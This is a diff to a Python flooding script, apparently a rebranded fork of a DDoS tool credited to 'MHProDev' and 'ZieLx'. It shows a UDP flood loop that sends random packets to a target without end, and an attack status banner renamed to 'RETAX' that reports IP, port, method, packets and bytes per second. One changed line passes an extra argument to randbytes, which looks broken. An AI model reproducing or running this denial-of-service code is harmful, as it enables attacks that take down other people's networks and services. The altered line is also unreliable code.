@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-#Code By MHProDev
-#Remake By ZieLx
+#Code : MHProDev
+#Remake : ZieLx
 
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -459,7 +459,7 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1025), self._target):
+            while Tools.sendto(s, randbytes(1025, 666), self._target):
                 continue
         Tools.safe_close(s)
 
@@ -1550,7 +1550,7 @@ if __name__ == '__main__':
               event.set()
               ts = time()
               while time() < ts + timer:
-                  print(f'{bcolors.OKCYAN}[ + ]{bcolors.FAIL} ZieLx Attack To Ip:{bcolors.OKCYAN} %s,{bcolors.FAIL} Port:{bcolors.OKCYAN} %s,{bcolors.FAIL} Method:{bcolors.OKCYAN} %s{bcolors.FAIL} PPS:{bcolors.OKCYAN} %s,{bcolors.FAIL} BPS:{bcolors.OKCYAN} %s / %d%%{bcolors.RESET}' %
+                  print(f'{bcolors.FAIL}RETAX Attack To Ip:{bcolors.OKCYAN} %s,{bcolors.FAIL} Port:{bcolors.OKCYAN} %s,{bcolors.FAIL} Method:{bcolors.OKCYAN} %s{bcolors.FAIL} PPS:{bcolors.OKCYAN} %s,{bcolors.FAIL} BPS:{bcolors.OKCYAN} %s / %d%%{bcolors.RESET}' %
                                (target or url.host,
                                 port or (url.port or 80),
                                 method,
